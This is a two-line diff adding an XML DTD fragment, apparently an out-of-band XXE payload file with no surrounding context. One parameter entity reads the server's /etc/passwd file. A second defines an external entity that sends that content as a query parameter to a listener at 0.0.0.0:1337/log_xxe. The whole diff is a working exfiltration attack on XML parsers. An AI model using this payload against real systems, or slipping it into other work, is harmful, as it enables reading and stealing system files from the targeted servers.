@@ -1,0 +1,2 @@
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://0.0.0.0:1337/log_xxe?data=%payload;'>">
